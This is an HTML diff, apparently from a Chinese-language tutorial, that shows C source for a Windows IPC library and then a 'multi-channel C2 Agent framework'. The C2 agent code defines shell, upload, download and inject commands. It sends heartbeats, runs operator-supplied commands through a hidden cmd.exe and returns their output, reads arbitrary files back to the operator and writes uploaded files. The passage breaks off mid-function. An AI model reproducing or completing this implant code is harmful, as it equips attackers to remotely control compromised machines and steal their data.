+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#B392F0">    LeaveCriticalSection</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">&#x26;</span><span style="color:#E1E4E8">pChannel->cs);</span></span>
+<span class="line"><span style="color:#B392F0">    DeleteCriticalSection</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">&#x26;</span><span style="color:#E1E4E8">pChannel->cs);</span></span>
+<span class="line"><span style="color:#B392F0">    free</span><span style="color:#E1E4E8">(pChannel);</span></span>
+<span class="line"><span style="color:#E1E4E8">}</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#E1E4E8">BOOL </span><span style="color:#B392F0">IPC_Send</span><span style="color:#E1E4E8">(PIPC_CHANNEL </span><span style="color:#FFAB70">pChannel</span><span style="color:#E1E4E8">, PIPC_MESSAGE </span><span style="color:#FFAB70">pMsg</span><span style="color:#E1E4E8">) {</span></span>
+<span class="line"><span style="color:#F97583">    if</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">!</span><span style="color:#E1E4E8">pChannel </span><span style="color:#F97583">||</span><span style="color:#F97583"> !</span><span style="color:#E1E4E8">pMsg) </span><span style="color:#F97583">return</span><span style="color:#79B8FF"> FALSE</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#E1E4E8">    BOOL bResult </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> FALSE</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">    DWORD dwWritten </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 0</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#B392F0">    EnterCriticalSection</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">&#x26;</span><span style="color:#E1E4E8">pChannel->cs);</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#F97583">    switch</span><span style="color:#E1E4E8"> (pChannel->Type) {</span></span>
+<span class="line"><span style="color:#F97583">        case</span><span style="color:#E1E4E8"> IPC_TYPE_FILEMAPPING:</span></span>
+<span class="line"><span style="color:#B392F0">            memcpy</span><span style="color:#E1E4E8">(pChannel</span><span style="color:#F97583">-></span><span style="color:#FFAB70">pSharedMem</span><span style="color:#E1E4E8">, pMsg, </span><span style="color:#F97583">sizeof</span><span style="color:#E1E4E8">(IPC_MESSAGE));</span></span>
+<span class="line"><span style="color:#E1E4E8">            bResult </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> TRUE</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#F97583">            break</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">            </span></span>
+<span class="line"><span style="color:#F97583">        case</span><span style="color:#E1E4E8"> IPC_TYPE_NAMEDPIPE:</span></span>
+<span class="line"><span style="color:#F97583">        case</span><span style="color:#E1E4E8"> IPC_TYPE_MAILSLOT:</span></span>
+<span class="line"><span style="color:#E1E4E8">            bResult </span><span style="color:#F97583">=</span><span style="color:#B392F0"> WriteFile</span><span style="color:#E1E4E8">(pChannel</span><span style="color:#F97583">-></span><span style="color:#FFAB70">hChannel</span><span style="color:#E1E4E8">, pMsg, </span></span>
+<span class="line"><span style="color:#F97583">                sizeof</span><span style="color:#E1E4E8">(IPC_MESSAGE), </span><span style="color:#F97583">&#x26;</span><span style="color:#FFAB70">dwWritten</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">NULL</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#F97583">            break</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#B392F0">    LeaveCriticalSection</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">&#x26;</span><span style="color:#E1E4E8">pChannel->cs);</span></span>
+<span class="line"><span style="color:#F97583">    return</span><span style="color:#E1E4E8"> bResult;</span></span>
+<span class="line"><span style="color:#E1E4E8">}</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#E1E4E8">BOOL </span><span style="color:#B392F0">IPC_Receive</span><span style="color:#E1E4E8">(PIPC_CHANNEL </span><span style="color:#FFAB70">pChannel</span><span style="color:#E1E4E8">, PIPC_MESSAGE </span><span style="color:#FFAB70">pMsg</span><span style="color:#E1E4E8">, DWORD </span><span style="color:#FFAB70">dwTimeout</span><span style="color:#E1E4E8">) {</span></span>
+<span class="line"><span style="color:#F97583">    if</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">!</span><span style="color:#E1E4E8">pChannel </span><span style="color:#F97583">||</span><span style="color:#F97583"> !</span><span style="color:#E1E4E8">pMsg) </span><span style="color:#F97583">return</span><span style="color:#79B8FF"> FALSE</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#E1E4E8">    BOOL bResult </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> FALSE</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">    DWORD dwRead </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 0</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#B392F0">    EnterCriticalSection</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">&#x26;</span><span style="color:#E1E4E8">pChannel->cs);</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#F97583">    switch</span><span style="color:#E1E4E8"> (pChannel->Type) {</span></span>
+<span class="line"><span style="color:#F97583">        case</span><span style="color:#E1E4E8"> IPC_TYPE_FILEMAPPING:</span></span>
+<span class="line"><span style="color:#B392F0">            memcpy</span><span style="color:#E1E4E8">(pMsg, pChannel</span><span style="color:#F97583">-></span><span style="color:#FFAB70">pSharedMem</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">sizeof</span><span style="color:#E1E4E8">(IPC_MESSAGE));</span></span>
+<span class="line"><span style="color:#E1E4E8">            bResult </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> TRUE</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#F97583">            break</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">            </span></span>
+<span class="line"><span style="color:#F97583">        case</span><span style="color:#E1E4E8"> IPC_TYPE_NAMEDPIPE:</span></span>
+<span class="line"><span style="color:#F97583">            if</span><span style="color:#E1E4E8"> (pChannel</span><span style="color:#F97583">-></span><span style="color:#E1E4E8">bServer) {</span></span>
+<span class="line"><span style="color:#6A737D">                // 服务端需要先连接</span></span>
+<span class="line"><span style="color:#B392F0">                ConnectNamedPipe</span><span style="color:#E1E4E8">(pChannel->hChannel, </span><span style="color:#79B8FF">NULL</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#E1E4E8">            }</span></span>
+<span class="line"><span style="color:#E1E4E8">            bResult </span><span style="color:#F97583">=</span><span style="color:#B392F0"> ReadFile</span><span style="color:#E1E4E8">(pChannel</span><span style="color:#F97583">-></span><span style="color:#FFAB70">hChannel</span><span style="color:#E1E4E8">, pMsg,</span></span>
+<span class="line"><span style="color:#F97583">                sizeof</span><span style="color:#E1E4E8">(IPC_MESSAGE), </span><span style="color:#F97583">&#x26;</span><span style="color:#FFAB70">dwRead</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">NULL</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#F97583">            break</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">            </span></span>
+<span class="line"><span style="color:#F97583">        case</span><span style="color:#E1E4E8"> IPC_TYPE_MAILSLOT:</span></span>
+<span class="line"><span style="color:#E1E4E8">            bResult </span><span style="color:#F97583">=</span><span style="color:#B392F0"> ReadFile</span><span style="color:#E1E4E8">(pChannel</span><span style="color:#F97583">-></span><span style="color:#FFAB70">hChannel</span><span style="color:#E1E4E8">, pMsg,</span></span>
+<span class="line"><span style="color:#F97583">                sizeof</span><span style="color:#E1E4E8">(IPC_MESSAGE), </span><span style="color:#F97583">&#x26;</span><span style="color:#FFAB70">dwRead</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">NULL</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#F97583">            break</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#B392F0">    LeaveCriticalSection</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">&#x26;</span><span style="color:#E1E4E8">pChannel->cs);</span></span>
+<span class="line"><span style="color:#F97583">    return</span><span style="color:#E1E4E8"> bResult;</span></span>
+<span class="line"><span style="color:#E1E4E8">}</span></span>
+<span class="line"></span></code></pre><h3 id="section-10">项目2：多通道C2 Agent框架</h3><pre class="shiki github-dark" style="background-color:#24292e;color:#e1e4e8" tabindex="0"><code><span class="line"><span style="color:#6A737D">// C2Agent.h - C2通信Agent头文件</span></span>
+<span class="line"><span style="color:#F97583">#ifndef</span><span style="color:#B392F0"> C2_AGENT_H</span></span>
+<span class="line"><span style="color:#F97583">#define</span><span style="color:#B392F0"> C2_AGENT_H</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#F97583">#include</span><span style="color:#9ECBFF"> &#x3C;windows.h></span></span>
+<span class="line"><span style="color:#F97583">#include</span><span style="color:#9ECBFF"> "IPCLib.h"</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6A737D">// 命令类型</span></span>
+<span class="line"><span style="color:#F97583">#define</span><span style="color:#B392F0"> CMD_NOP</span><span style="color:#F97583">         0x</span><span style="color:#79B8FF">00</span></span>
+<span class="line"><span style="color:#F97583">#define</span><span style="color:#B392F0"> CMD_HEARTBEAT</span><span style="color:#F97583">   0x</span><span style="color:#79B8FF">01</span></span>
+<span class="line"><span style="color:#F97583">#define</span><span style="color:#B392F0"> CMD_SHELL</span><span style="color:#F97583">       0x</span><span style="color:#79B8FF">10</span></span>
+<span class="line"><span style="color:#F97583">#define</span><span style="color:#B392F0"> CMD_UPLOAD</span><span style="color:#F97583">      0x</span><span style="color:#79B8FF">20</span></span>
+<span class="line"><span style="color:#F97583">#define</span><span style="color:#B392F0"> CMD_DOWNLOAD</span><span style="color:#F97583">    0x</span><span style="color:#79B8FF">21</span></span>
+<span class="line"><span style="color:#F97583">#define</span><span style="color:#B392F0"> CMD_INJECT</span><span style="color:#F97583">      0x</span><span style="color:#79B8FF">30</span></span>
+<span class="line"><span style="color:#F97583">#define</span><span style="color:#B392F0"> CMD_EXIT</span><span style="color:#F97583">        0x</span><span style="color:#79B8FF">FF</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6A737D">// Agent状态</span></span>
+<span class="line"><span style="color:#F97583">typedef</span><span style="color:#F97583"> enum</span><span style="color:#E1E4E8"> _AGENT_STATE {</span></span>
+<span class="line"><span style="color:#E1E4E8">    AGENT_IDLE </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 0</span><span style="color:#E1E4E8">,</span></span>
+<span class="line"><span style="color:#E1E4E8">    AGENT_RUNNING,</span></span>
+<span class="line"><span style="color:#E1E4E8">    AGENT_PAUSED,</span></span>
+<span class="line"><span style="color:#E1E4E8">    AGENT_STOPPED</span></span>
+<span class="line"><span style="color:#E1E4E8">} AGENT_STATE;</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6A737D">// Agent上下文</span></span>
+<span class="line"><span style="color:#F97583">typedef</span><span style="color:#F97583"> struct</span><span style="color:#E1E4E8"> _AGENT_CONTEXT {</span></span>
+<span class="line"><span style="color:#E1E4E8">    DWORD           dwAgentId;</span></span>
+<span class="line"><span style="color:#E1E4E8">    AGENT_STATE     State;</span></span>
+<span class="line"><span style="color:#E1E4E8">    PIPC_CHANNEL    </span><span style="color:#FFAB70">Channels</span><span style="color:#E1E4E8">[</span><span style="color:#79B8FF">4</span><span style="color:#E1E4E8">];</span></span>
+<span class="line"><span style="color:#F97583">    int</span><span style="color:#E1E4E8">             nActiveChannel;</span></span>
+<span class="line"><span style="color:#E1E4E8">    HANDLE          hWorkerThread;</span></span>
+<span class="line"><span style="color:#E1E4E8">    HANDLE          hHeartbeatThread;</span></span>
+<span class="line"><span style="color:#E1E4E8">    BOOL            bRunning;</span></span>
+<span class="line"><span style="color:#E1E4E8">    CRITICAL_SECTION cs;</span></span>
+<span class="line"><span style="color:#E1E4E8">} AGENT_CONTEXT, </span><span style="color:#F97583">*</span><span style="color:#E1E4E8">PAGENT_CONTEXT;</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6A737D">// API</span></span>
+<span class="line"><span style="color:#E1E4E8">PAGENT_CONTEXT </span><span style="color:#B392F0">Agent_Initialize</span><span style="color:#E1E4E8">(DWORD </span><span style="color:#FFAB70">dwId</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#E1E4E8">VOID </span><span style="color:#B392F0">Agent_Shutdown</span><span style="color:#E1E4E8">(PAGENT_CONTEXT </span><span style="color:#FFAB70">pCtx</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#E1E4E8">BOOL </span><span style="color:#B392F0">Agent_Start</span><span style="color:#E1E4E8">(PAGENT_CONTEXT </span><span style="color:#FFAB70">pCtx</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#E1E4E8">VOID </span><span style="color:#B392F0">Agent_ExecuteCommand</span><span style="color:#E1E4E8">(PAGENT_CONTEXT </span><span style="color:#FFAB70">pCtx</span><span style="color:#E1E4E8">, PIPC_MESSAGE </span><span style="color:#FFAB70">pCmd</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#F97583">#endif</span></span>
+<span class="line"></span></code></pre><pre class="shiki github-dark" style="background-color:#24292e;color:#e1e4e8" tabindex="0"><code><span class="line"><span style="color:#6A737D">// C2Agent.c - C2通信Agent实现</span></span>
+<span class="line"><span style="color:#F97583">#include</span><span style="color:#9ECBFF"> &#x3C;stdio.h></span></span>
+<span class="line"><span style="color:#F97583">#include</span><span style="color:#9ECBFF"> &#x3C;stdlib.h></span></span>
+<span class="line"><span style="color:#F97583">#include</span><span style="color:#9ECBFF"> "C2Agent.h"</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6A737D">// 心跳线程</span></span>
+<span class="line"><span style="color:#E1E4E8">DWORD WINAPI </span><span style="color:#B392F0">HeartbeatThread</span><span style="color:#E1E4E8">(LPVOID </span><span style="color:#FFAB70">lpParam</span><span style="color:#E1E4E8">) {</span></span>
+<span class="line"><span style="color:#E1E4E8">    PAGENT_CONTEXT pCtx </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> (PAGENT_CONTEXT)lpParam;</span></span>
+<span class="line"><span style="color:#E1E4E8">    IPC_MESSAGE msg </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> {</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">};</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#E1E4E8">    msg.dwMsgId </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> CMD_HEARTBEAT;</span></span>
+<span class="line"><span style="color:#E1E4E8">    msg.dwFlags </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 0</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#F97583">    while</span><span style="color:#E1E4E8"> (pCtx->bRunning) {</span></span>
+<span class="line"><span style="color:#6A737D">        // 获取系统信息作为心跳数据</span></span>
+<span class="line"><span style="color:#E1E4E8">        DWORD pid </span><span style="color:#F97583">=</span><span style="color:#B392F0"> GetCurrentProcessId</span><span style="color:#E1E4E8">();</span></span>
+<span class="line"><span style="color:#E1E4E8">        DWORD tick </span><span style="color:#F97583">=</span><span style="color:#B392F0"> GetTickCount</span><span style="color:#E1E4E8">();</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#B392F0">        sprintf</span><span style="color:#E1E4E8">((</span><span style="color:#F97583">char*</span><span style="color:#E1E4E8">)msg.bData, </span><span style="color:#9ECBFF">"HB|</span><span style="color:#79B8FF">%d</span><span style="color:#9ECBFF">|</span><span style="color:#79B8FF">%d</span><span style="color:#9ECBFF">|</span><span style="color:#79B8FF">%d</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">, </span></span>
+<span class="line"><span style="color:#E1E4E8">                pCtx->dwAgentId, pid, tick);</span></span>
+<span class="line"><span style="color:#E1E4E8">        msg.dwDataSize </span><span style="color:#F97583">=</span><span style="color:#B392F0"> strlen</span><span style="color:#E1E4E8">((</span><span style="color:#F97583">char*</span><span style="color:#E1E4E8">)msg.bData) </span><span style="color:#F97583">+</span><span style="color:#79B8FF"> 1</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#6A737D">        // 尝试通过可用通道发送</span></span>
+<span class="line"><span style="color:#B392F0">        EnterCriticalSection</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">&#x26;</span><span style="color:#E1E4E8">pCtx->cs);</span></span>
+<span class="line"><span style="color:#F97583">        for</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">int</span><span style="color:#E1E4E8"> i </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 0</span><span style="color:#E1E4E8">; i </span><span style="color:#F97583">&#x3C;</span><span style="color:#79B8FF"> 4</span><span style="color:#E1E4E8">; i</span><span style="color:#F97583">++</span><span style="color:#E1E4E8">) {</span></span>
+<span class="line"><span style="color:#F97583">            if</span><span style="color:#E1E4E8"> (pCtx->Channels[i]) {</span></span>
+<span class="line"><span style="color:#F97583">                if</span><span style="color:#E1E4E8"> (</span><span style="color:#B392F0">IPC_Send</span><span style="color:#E1E4E8">(pCtx->Channels[i], </span><span style="color:#F97583">&#x26;</span><span style="color:#E1E4E8">msg)) {</span></span>
+<span class="line"><span style="color:#E1E4E8">                    pCtx->nActiveChannel </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> i;</span></span>
+<span class="line"><span style="color:#F97583">                    break</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">                }</span></span>
+<span class="line"><span style="color:#E1E4E8">            }</span></span>
+<span class="line"><span style="color:#E1E4E8">        }</span></span>
+<span class="line"><span style="color:#B392F0">        LeaveCriticalSection</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">&#x26;</span><span style="color:#E1E4E8">pCtx->cs);</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#B392F0">        Sleep</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">5000</span><span style="color:#E1E4E8">);</span><span style="color:#6A737D">  // 5秒心跳间隔</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#F97583">    return</span><span style="color:#79B8FF"> 0</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">}</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6A737D">// 命令执行</span></span>
+<span class="line"><span style="color:#E1E4E8">VOID </span><span style="color:#B392F0">Agent_ExecuteCommand</span><span style="color:#E1E4E8">(PAGENT_CONTEXT </span><span style="color:#FFAB70">pCtx</span><span style="color:#E1E4E8">, PIPC_MESSAGE </span><span style="color:#FFAB70">pCmd</span><span style="color:#E1E4E8">) {</span></span>
+<span class="line"><span style="color:#E1E4E8">    IPC_MESSAGE response </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> {</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">};</span></span>
+<span class="line"><span style="color:#E1E4E8">    response.dwMsgId </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> pCmd->dwMsgId;</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#F97583">    switch</span><span style="color:#E1E4E8"> (pCmd->dwMsgId) {</span></span>
+<span class="line"><span style="color:#F97583">        case</span><span style="color:#E1E4E8"> CMD_SHELL: {</span></span>
+<span class="line"><span style="color:#6A737D">            // 执行Shell命令</span></span>
+<span class="line"><span style="color:#F97583">            char</span><span style="color:#FFAB70"> cmdline</span><span style="color:#E1E4E8">[</span><span style="color:#79B8FF">4096</span><span style="color:#E1E4E8">];</span></span>
+<span class="line"><span style="color:#B392F0">            sprintf</span><span style="color:#E1E4E8">(cmdline, </span><span style="color:#9ECBFF">"cmd.exe /c </span><span style="color:#79B8FF">%s</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">, pCmd->bData);</span></span>
+<span class="line"><span style="color:#E1E4E8">            </span></span>
+<span class="line"><span style="color:#E1E4E8">            SECURITY_ATTRIBUTES sa </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> {</span><span style="color:#F97583">sizeof</span><span style="color:#E1E4E8">(sa), </span><span style="color:#79B8FF">NULL</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">TRUE</span><span style="color:#E1E4E8">};</span></span>
+<span class="line"><span style="color:#E1E4E8">            HANDLE hReadPipe, hWritePipe;</span></span>
+<span class="line"><span style="color:#B392F0">            CreatePipe</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">&#x26;</span><span style="color:#E1E4E8">hReadPipe, </span><span style="color:#F97583">&#x26;</span><span style="color:#E1E4E8">hWritePipe, </span><span style="color:#F97583">&#x26;</span><span style="color:#E1E4E8">sa, </span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#E1E4E8">            </span></span>
+<span class="line"><span style="color:#E1E4E8">            STARTUPINFOA si </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> {</span><span style="color:#F97583">sizeof</span><span style="color:#E1E4E8">(si)};</span></span>
+<span class="line"><span style="color:#E1E4E8">            PROCESS_INFORMATION pi;</span></span>
+<span class="line"><span style="color:#E1E4E8">            si.dwFlags </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> STARTF_USESTDHANDLES;</span></span>
+<span class="line"><span style="color:#E1E4E8">            si.hStdOutput </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> hWritePipe;</span></span>
+<span class="line"><span style="color:#E1E4E8">            si.hStdError </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> hWritePipe;</span></span>
+<span class="line"><span style="color:#E1E4E8">            </span></span>
+<span class="line"><span style="color:#F97583">            if</span><span style="color:#E1E4E8"> (</span><span style="color:#B392F0">CreateProcessA</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">NULL</span><span style="color:#E1E4E8">, cmdline, </span><span style="color:#79B8FF">NULL</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">NULL</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">TRUE</span><span style="color:#E1E4E8">,</span></span>
+<span class="line"><span style="color:#E1E4E8">                    CREATE_NO_WINDOW, </span><span style="color:#79B8FF">NULL</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">NULL</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">&#x26;</span><span style="color:#E1E4E8">si, </span><span style="color:#F97583">&#x26;</span><span style="color:#E1E4E8">pi)) {</span></span>
+<span class="line"><span style="color:#B392F0">                CloseHandle</span><span style="color:#E1E4E8">(hWritePipe);</span></span>
+<span class="line"><span style="color:#E1E4E8">                </span></span>
+<span class="line"><span style="color:#E1E4E8">                DWORD dwRead;</span></span>
+<span class="line"><span style="color:#B392F0">                ReadFile</span><span style="color:#E1E4E8">(hReadPipe, response.bData, </span></span>
+<span class="line"><span style="color:#F97583">                    sizeof</span><span style="color:#E1E4E8">(response.bData) </span><span style="color:#F97583">-</span><span style="color:#79B8FF"> 1</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">&#x26;</span><span style="color:#E1E4E8">dwRead, </span><span style="color:#79B8FF">NULL</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#E1E4E8">                response.dwDataSize </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> dwRead;</span></span>
+<span class="line"><span style="color:#E1E4E8">                </span></span>
+<span class="line"><span style="color:#B392F0">                WaitForSingleObject</span><span style="color:#E1E4E8">(pi.hProcess, </span><span style="color:#79B8FF">30000</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#B392F0">                CloseHandle</span><span style="color:#E1E4E8">(pi.hProcess);</span></span>
+<span class="line"><span style="color:#B392F0">                CloseHandle</span><span style="color:#E1E4E8">(pi.hThread);</span></span>
+<span class="line"><span style="color:#E1E4E8">            }</span></span>
+<span class="line"><span style="color:#B392F0">            CloseHandle</span><span style="color:#E1E4E8">(hReadPipe);</span></span>
+<span class="line"><span style="color:#F97583">            break</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">        }</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#F97583">        case</span><span style="color:#E1E4E8"> CMD_DOWNLOAD: {</span></span>
+<span class="line"><span style="color:#6A737D">            // 读取文件内容</span></span>
+<span class="line"><span style="color:#E1E4E8">            HANDLE hFile </span><span style="color:#F97583">=</span><span style="color:#B392F0"> CreateFileA</span><span style="color:#E1E4E8">((</span><span style="color:#F97583">char*</span><span style="color:#E1E4E8">)pCmd->bData,</span></span>
+<span class="line"><span style="color:#E1E4E8">                GENERIC_READ, FILE_SHARE_READ, </span><span style="color:#79B8FF">NULL</span><span style="color:#E1E4E8">,</span></span>
+<span class="line"><span style="color:#E1E4E8">                OPEN_EXISTING, </span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">NULL</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#E1E4E8">            </span></span>
+<span class="line"><span style="color:#F97583">            if</span><span style="color:#E1E4E8"> (hFile </span><span style="color:#F97583">!=</span><span style="color:#E1E4E8"> INVALID_HANDLE_VALUE) {</span></span>
+<span class="line"><span style="color:#E1E4E8">                DWORD dwRead;</span></span>
+<span class="line"><span style="color:#B392F0">                ReadFile</span><span style="color:#E1E4E8">(hFile, response.bData, </span></span>
+<span class="line"><span style="color:#F97583">                    sizeof</span><span style="color:#E1E4E8">(response.bData), </span><span style="color:#F97583">&#x26;</span><span style="color:#E1E4E8">dwRead, </span><span style="color:#79B8FF">NULL</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#E1E4E8">                response.dwDataSize </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> dwRead;</span></span>
+<span class="line"><span style="color:#B392F0">                CloseHandle</span><span style="color:#E1E4E8">(hFile);</span></span>
+<span class="line"><span style="color:#E1E4E8">            }</span></span>
+<span class="line"><span style="color:#F97583">            break</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">        }</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#F97583">        case</span><span style="color:#E1E4E8"> CMD_UPLOAD: {</span></span>
+<span class="line"><span style="color:#6A737D">            // 写入文件</span></span>
+<span class="line"><span style="color:#F97583">            char*</span><span style="color:#E1E4E8"> sep </span><span style="color:#F97583">=</span><span style="color:#B392F0"> strchr</span><span style="color:#E1E4E8">((</span><span style="color:#F97583">char*</span><span style="color:#E1E4E8">)pCmd->bData, </span><span style="color:#9ECBFF">'|'</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#F97583">            if</span><span style="color:#E1E4E8"> (sep) {</span></span>
+<span class="line"><span style="color:#F97583">                *</span><span style="color:#E1E4E8">sep </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 0</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#F97583">                char*</span><span style="color:#E1E4E8"> filename </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">char*</span><span style="color:#E1E4E8">)pCmd->bData;</span></span>
+<span class="line"><span style="color:#F97583">                char*</span><span style="color:#E1E4E8"> content </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> sep </span><span style="color:#F97583">+</span><span style="color:#79B8FF"> 1</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">                </span></span>
+<span class="line"><span style="color:#E1E4E8">                HANDLE hFile </span><span style="color:#F97583">=</span><span style="color:#B392F0"> CreateFileA</span><span style="color:#E1E4E8">(filename,</span></span>
+<span class="line"><span style="color:#E1E4E8">                    GENERIC_WRITE, </span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">NULL</span><span style="color:#E1E4E8">,</span></span>
+<span class="line"><span style="color:#E1E4E8">                    CREATE_ALWAYS, </span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">NULL</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#E1E4E8">                </span></span>
+<span class="line"><span style="color:#F97583">                if</span><span style="color:#E1E4E8"> (hFile </span><span style="color:#F97583">!=</span><span style="color:#E1E4E8"> INVALID_HANDLE_VALUE) {</span></span>
+<span class="line"><span style="color:#E1E4E8">                    DWORD dwWritten;</span></span>
+<span class="line"><span style="color:#B392F0">                    WriteFile</span><span style="color:#E1E4E8">(hFile, content, </span></span>
